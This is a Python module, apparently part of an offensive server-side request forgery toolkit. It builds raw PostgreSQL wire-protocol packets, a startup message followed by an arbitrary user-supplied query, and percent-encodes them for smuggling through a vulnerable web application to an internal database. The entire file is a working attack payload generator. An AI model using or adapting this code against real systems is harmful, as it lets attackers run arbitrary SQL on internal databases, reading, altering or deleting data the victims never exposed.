from .base import *

class PostgreSQL(GENERATOR):
    requirement = ["user", "db", "query"]
    
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 5432
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.user == "":
            self.user = self.wizard_user()
        else:
            self.user = arg.user

        if arg.db == "":
            self.db = self.wizard_db()
        else:
            self.db = arg.db

        if arg.query == "":
            self.query = self.wizard_query()
        else:
            self.query = arg.query

    def wizard_user(self):
        user = input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
        return user
    def wizard_db(self):
        db = input("\033[96m" + "Database Name: " + "\033[0m")
        return db
    def wizard_query(self):
        query = input("\033[96m" + "Query: " + "\033[0m")
        return query
    
    def generate(self):
        user = self.user
        db = self.db
        query = self.query
        encode_user = encodehex(user)
        encode_db = encodehex(db)
        encode_query = encodehex(query)
        len_query = len(query) + 5
        pattern_user_db = 4 + len(user) + 8 + len(db) + 13
        start = "000000" + encodehex(chr(pattern_user_db)) + "000300"
        data = "00" + encodehex("user") + "00" + encode_user + "00" + encodehex("database") + "00" + encode_db
        # data = "00" + "user".encode("hex") + "00" + encode_user + "00" + "database".encode("hex") + "00" + encode_db
        data += "0000510000" + str(hex(len_query)[2:]).zfill(4)
        data += encode_query
        end = "005800000004"
        packet = start + data + end
        self.set_mode(PAYLOAD_TYPE.NONE).set_payload(encode(packet))
        payload = super().generate()
        return payload

def encodehex( s):
    final = ""
    for c in s:
        final += hex(ord(c)).replace("0x", "")
    return final
def decodehex(s):
    final = ""
    for i in range(0, len(s), 2):
        final += chr(int(s[i:i+2], 16))
    return final

def encode(s):
	a = [s[i:i + 2] for i in range(0, len(s), 2)]
	return "%" + "%".join(a)